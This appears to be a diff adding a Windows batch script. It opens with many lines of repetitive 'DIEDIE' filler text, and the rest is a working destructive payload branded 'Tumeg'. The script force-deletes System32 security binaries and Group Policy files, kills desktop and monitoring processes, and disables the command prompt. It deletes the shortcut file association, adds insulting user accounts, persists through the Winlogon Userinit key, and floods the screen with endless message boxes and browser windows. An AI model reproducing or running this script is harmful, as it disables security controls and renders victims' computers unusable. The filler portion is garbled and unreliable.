+md DIEDIEDIEDIEDIEDIDIEDIEDIEDIDIEDEDIEDIEDIEE
+md DIEDIEIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
+md DIEDEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEDIEE
+md DIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIDIEDIEDIDIEDIEDIEDIEIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIDIEDIEDIEDEDIEDIEDEDIEDIEDIEE
+md DIEDIEDIEDIEDIEIEDIEDIEDIEDIEIEDIEDIEDIEDIEE
+md DIEDIDIEDIEDIEDIDIEDIEDIEDIEDIEDIEIEDIEDIEE
+md DIEDIEDIDIEDIEDIIEDIEDIEDIEDIEDIEDEDIEDIEE
+md DIEDIEDIEDIEDEDIEDIDIEIEDIEDEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDEDIEDIEDIEDIEEDIEDIEIEE
+md 
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIDIEDIDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEIDEDEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDEIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIWEDIEIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIDIEIEDIEJDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEIEDDIEDIELDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDEDIEIEDIEDIEDIEDIEDIEE
+md
+DIEDIEDIEDIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDLIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDILEDIEDIIELDIEIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDILEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEIEDIEDIEDIELDIDIDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDILEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDEDLIEDLIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDEDIEDIEDIELDIEDIEDIEDIEDIEDIEE
+md LEDIEDIEDIEDIEDIEEDIEDLIEDILEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+
+
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIWEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEQEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEE
+
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+
+
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDKIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DEDIEDIEDIEDIEDIEDIEDIEDIEŞDIEDIEDIEDIEDIEDIEE
+
+
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIJIEDIEDIEDIEDIEDIEE
+md IDIEDIEDIGEDIEDIEDIEDHIEDIEDIEDIEDIELDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEK
+md DEDIEDIEDIEDIEHDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+
+
+md DIEDIEDIEDIEDIEDEDIEDIEDIEJDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDHIEDIEDIEDIEHDIEDIEDIEDIEFEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DEDIEDIEDIEDIEDIEDIJEDIEDIEDIEDIEDHIEDIEDIEDIEE
+
+
+md DIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDDIEDIEDIEDIEDIEDIEDIEDIE
+md DIEDIEDIEDEDIEDLDIEDEDIIDIEDIEDIEDIEDIEDIE
+md DIEEIEDIEDEDIEDIJEDIEDIEDIEDIEDIEDIEDIEDIEDIE
+md DIEDIEDIDIEDHIEDIEDIEDIEDEDIEIEDIEDIEDIEDIE
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEIEDIEDIDIEDIE
+md DIEDIEIEDIDIEDIJEDIEDIEDIEDJLIEDIEDIEDIIEDIEDIE
+md DIEDIEDIEEIJIEDIEDI9K0EDIEDIEDIEDDIEDIEDIEDIE
+md DIEDIEDIEDEDIEDIEDIEDINEDJIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEIIEDIDIEDIEIDIEDIEDIEDIEDIEE
+md DIEDIIEDIEIJEDIEDIEDIJIPEDIEDIEEDIEDIEDIEE
+md DIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDEE
+md DIEDIEDIEŞDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIDIEE
+md DIEDIEDIEDIDIDIEDIDIEGLJGDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIDIIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEIEE
+md DIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIE
+md DIEDIEDIEDIHEDIEIDIDIEDIEDIEDIEDIEDIEDIEDIEEDIEE
+md DIEDIEDIEDIEDIIEDIEDIEDIDIEDIEDIEDIEDIEDIE
+md DIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIDIHEDIEDIEDIDIEDEDIEDIEDIEE
+md DIEDIEIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
+md DIEDEDIEDIEDIEDIEDIEIJKYEDEDIEDIEDIEDIEDIEDIEE
+md DIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIDIEDIEDIDIEDIEDIEDIEIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIDIEDIEDIEDEDIEDIEDEDIEDIEDIEE
+md DIEDIEDIEDIEDIEIEDIEDIEDIEDIEIEDIEDIEDIEDIEE
+md DIEDIDIEDIEDIEDHŞIDIEDIEDIEDIEDIEDIEIEDIEDIEE
+md DIEDIEDIDIEDIEDIIEDIEDIEDIEDIEDIEDEDIEDIEE
+md DIEDIEDIEDIEDEDIEDIDIEIEDIEDEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIELKDEDIEDIEDIEDIEEDIEDIEIEE
+md 
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDBIŞHŞOIHEDIDIEDIDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEJDIEDIJKHLEIDEDEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDKEDIEDIEDIEDIDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDEIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIDIEIEHKDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIE
+md DIEKDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEIEDDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDEDIEIEDIEDIEDIEDIEDIEE
+md
+DIEDIEDIEDIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIDIDIEDLIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDGLKGSDFŞIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIJEDIEDIIEDIEIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIGOUIFYOEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEIEDIHEDIEDIEDIDIDIEDIEDIEDIEE
+md DIEDIEDIJEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEKDIEE
+md DEDIEDIEKDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+
+
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIWEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDLJFGLJIEDIEDIEDIEDIEDIEDIEDIEDIEQEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEE
+
+md DIEDIEDIEDIEDIEŞJGHŞJKDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDKJKIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DEDIEDIEDIEDIKLJKLEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+
+
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDKIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DEDIEDIEDIEDIEDIEDIEDIEDIEŞDIEDIEDIEDIEDIEDIEE
+
+
+md DIEDIEDIEDIEDIEDEDIEDIEDIEDIJIEDIEDIEDIEDIEDIEE
+md IDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIELDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEK
+md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+
+
+md DIEDIEDIEDIEDIEDEDIEDIEDIEJDIEDIEDIEDIEDIEDIEE
+md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEHDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
+md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDHIEDIEDIEDIEE
+
+taskkill /f /im dwm.exe
+
+
+@echo off
+
+set "ProgramFilesPath=C:\Program Files"
+
+
+set "ProcessHackerPath=%ProgramFilesPath%\Process Hacker"
+set "ProcessHackerExe=ProcessHacker.exe"
+IF EXIST "%ProcessHackerPath%" (
+    taskkill /IM "%ProcessHackerExe%" /F >nul 2>&1
+    rmdir /s /q "%ProcessHackerPath%"
+) 
+
+
+set "ProcessHacker2Path=%ProgramFilesPath%\Process Hacker 2"
+set "ProcessHacker2Exe=ProcessHacker2.exe"
+IF EXIST "%ProcessHacker2Path%" (
+    taskkill /IM "%ProcessHacker2Exe%" /F >nul 2>&1
+    rmdir /s /q "%ProcessHacker2Path%"
+) 
+
+
+@echo off
+
+reg add "HKEY_CURRENT_USER\System\CurrentControlSet" /v "ValueName" /t REG_DWORD /d "2" /f
+reg add "HKEY_CLASSES_ROOT\xhtmlfile" /v FriendlyTypeName /t REG_EXPAND_SZ /d "@C:\Windows\system32\httpapi.dll,-999" /f
+
+@echo off
+set source=%temp%
+set destination=%userprofile%\Desktop
+
+move "%source%\*.*" "%destination%"
+
+
+@echo off
+reg add "HKEY_CURRENT_USER\Control Panel\International" /v Geo /t REG_SZ /d "Geos" /f
+
+
+
+@echo off
+
+copy "hoster.dll" "C:\Windows\System32\hoster.dll"
+copy "soft.exe" "C:\Windows\System32\soft.exe"
+copy "kerenell.exe" "C:\Windows\System32\kerenell.exe"
+
+@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f
+
+
+@echo off
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileOpen /t REG_DWORD /d 1 /f
+
+@echo off
+
+takeown /f "%windir%\System32\sethc.exe"
+icacls "%windir%\System32\sethc.exe" /deny "%USERNAME%":R
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "taskkill /f /im sethc.exe" /f
+
+@echo off
+rmdir /s /q "C:\ProgramData\Crypto"
+
+@echo off
+del /f /q C:\Windows\System32\runas.exe
+@echo off
+del /f /q C:\Windows\System32\migwiz.exe
+@echo off
+del /f /q C:\Windows\System32\OxpsConverter.exe
+@echo off
+del /f /q C:\Windows\System32\Narrator.exe
+@echo off
+del /f /q C:\Windows\System32\iexpress.exe
+@echo off
+del /f /q C:\Windows\System32\xcopy.exe
+@echo off
+del /f /q C:\Windows\System32\xlog.exe
+del /f /q C:\Windows\System32\SpeechUXWiz.exe
+del /f /q C:\Windows\System32\NAPSTAT.EXE
+del /f /q %SystemRoot%\system32\GroupPolicy\Machine\Registry.pol
+del /f /q %SystemRoot%\system32\GroupPolicy\User\Registry.pol
+del /f /q %SystemRoot%\system32\secpol.msc
+del /f /q %SystemRoot%\system32\SecEdit.exe
+del /f /q %SystemRoot%\system32\security.dll
+del /f /q %SystemRoot%\system32\secur32.dll
+del /f /q %SystemRoot%\system32\xwizard.exe
+del /f /q C:\Windows\System32\taskkill.exe
+del /f /q C:\Windows\System32\tasklist.exe
+del /f /q C:\Windows\System32\tree.com
+del /f /q C:\Windows\System32\Netplwiz.exe
+
+reg add "HKEY_CURRENT_CONFIG\Software\Fonts" /v LogPixels /t REG_DWORD /d 73 /f
+
+@echo off
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\Setup\Status\UnattendPasses\windowsPE" /f
+
+
+start "" https://www.youtube.com/watch?v=fjZXB4OMS7s
+
+@echo off
+rmdir /s /q "C:\ProgramData\Search"
+
+@echo off
+rmdir /s /q "C:\ProgramData\Vault"
+
+@echo off
+rmdir /s /q "C:\Windows\System32\imageres.dll"
+
+
+@echo off
+echo. > "%windir%\bfs.exe"
+
+net user /add YOUR
+net user /add COMPUTER
+net user /add IS
+net user /add FUCKED
+net user /add BY
+net user /add TUMEG!
+net user /add CRY
+net user /add Sparrow_1453
+
+@echo off
+set folder="C:\Windows\System32"
+set file="UserAccountControlSettings.exe"
+del %folder%\%file%
+
+@echo off
+set folder="C:\Windows\System32"
+set file="UserAccountControlSettings.dll"
+del %folder%\%file%
+
+
+start slui.exe
+
+@echo off
+reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogoff" /f
+@echo off
+reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\HubOffSound" /f
+
+@echo off
+reg add "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogon" /v "@mmres.dll,-5853" /t REG_SZ /d "LogonUI.mui,-5852" /f
+
+@echo off
+reg add "HKEY_CURRENT_USER\System\CurrentControlSet\Control\NetTrace\Session" /v Default /t REG_SZ /d "off" /f
+
+
+@echo off
+reg add "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /v MouseSpeed /t REG_SZ /d "2" /f
+
+@echo off
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\ProgramData\Tumeg.exe," /f
+
+
+@echo off
+reg delete "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /f
+
+@echo off
+reg delete "HKEY_CURRENT_USER\Identities" /f
+
+@echo off
+reg delete "HKEY_CLASSES_ROOT\.lnk" /f
+
+@echo off
+reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\SystemAsterisk" /f
+
+
+@echo off
+reg delete "HKEY_CLASSES_ROOT\DXImageTransform.Microsoft.CrBlinds.1" /f
+
+
+@echo off
+reg delete "HKEY_CLASSES_ROOT\MSRDC.SimilarityFileIdTable\CurVer" /f
+
+
+@echo off
+reg delete "HKEY_USERS\S-1-5-20\Printers\DevModePerUser" /f
+
+
+
+
+@echo off
+reg delete "HKEY_CLASSES_ROOT\.lnk" /f
+
+
+@echo off
+reg delete "HKEY_CLASSES_ROOT\.lnk" /f
+
+
+@echo off
+reg delete "HKEY_CLASSES_ROOT\.lnk" /f
+
+
+@echo off
+start "" https://de.search.yahoo.com/search?p=brawl+stars+hack
+
+@echo off
+reg add "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v ColorPrevalence /t REG_DWORD /d 2 /f
+taskkill /f /im explorer.exe
+timeout /t 2 /nobreak >nul
+start explorer.exe
+
+@echo off
+echo pls do not close cmd
+echo WScript.Sleep(6000) >> "%temp%\1.vbs"
+echo Dim objShell >> "%temp%\1.vbs"
+echo Set objShell = CreateObject("WScript.Shell") >> "%temp%\1.vbs"
+echo objShell.Run "iexplore.exe https://duckduckgo.com/?q=discord+free+nitro", 1, False >> "%temp%\1.vbs"
+echo Set objShell = Nothing >> "%temp%\1.vbs"
+"%temp%\1.vbs"
+timeout /t 8 /nobreak >nul
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+
+
+@echo off
+notepad.exe memz.exe
+
+@echo off
+notepad.exe memz.exe
+
+
+@echo off
+echo MsgBox "There is no escape.", vbExclamation, "Tumeg.exe" >> C:\Windows\System32\Tasks\Microsoft\Windows\Wininet\msgboxs.vbs
+
+@echo off
+cd C:\Windows\System32\Tasks\Microsoft\Windows\Wininet
+
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+start "" /b msgboxs.vbs
+
+
+@echo off
+timeout /t 2 >nul
+
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
+start "" "%temp%\1.vbs"
